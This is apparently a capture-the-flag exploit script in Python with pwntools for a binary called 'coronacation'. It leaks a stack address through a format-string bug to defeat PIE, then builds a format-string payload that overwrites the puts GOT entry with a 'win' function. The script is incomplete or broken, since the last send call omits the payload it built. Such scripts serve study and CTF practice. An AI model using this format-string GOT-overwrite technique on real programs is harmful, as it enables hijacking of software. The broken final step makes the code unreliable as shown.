from pwn import *
from libformatstr import FormatStr

context.binary = elf = ELF('./coronacation')
p = process('./coronacation')
gdb.attach(p, '''
    init-gef
''')

payload = "%12$p"
p.sendlineafter("freaking out.\n", '1' * 4 + payload)
p.recvuntil("1111")
pie = int(p.recvline(keepends=False), 16) - 0x1490
log.info("PIE: 0x{:x}".format(pie))
elf.address = pie

f = FormatStr(isx64=1)
f[elf.got['puts']] = elf.symbols['win']
# f.payload()
payload = "1" * 8 + f.payload(7, start_len=8)
print len(payload)
p.sendlineafter("healthcare plan.\n", )

p.interactive()
